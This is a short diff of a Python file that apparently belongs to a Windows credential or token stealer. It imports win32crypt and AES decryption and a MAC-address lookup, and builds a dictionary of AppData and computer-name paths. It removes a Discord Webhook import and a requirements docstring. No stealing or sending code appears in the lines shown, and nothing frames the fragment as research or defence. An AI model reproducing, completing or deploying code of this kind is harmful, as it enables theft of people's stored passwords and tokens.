@@ -9,19 +9,8 @@ import win32crypt
 from re import findall
 from Crypto.Cipher import AES
 from getmac import get_mac_address as getMacAddrr
-from discord import Webhook, RequestsWebhookAdapter
 
-"""
-requirements
-
-pip install getmac
-pip install requests
-pip install pycrypto
-pip install pycryptodome
-pip install pypiwin32
-pip install discord
-"""
-
+#Guthmaer
 allEnv={'appLocal':'LOCALAPPDATA',
         'appRoaming':'APPDATA',
         'pcName':'COMPUTERNAME',
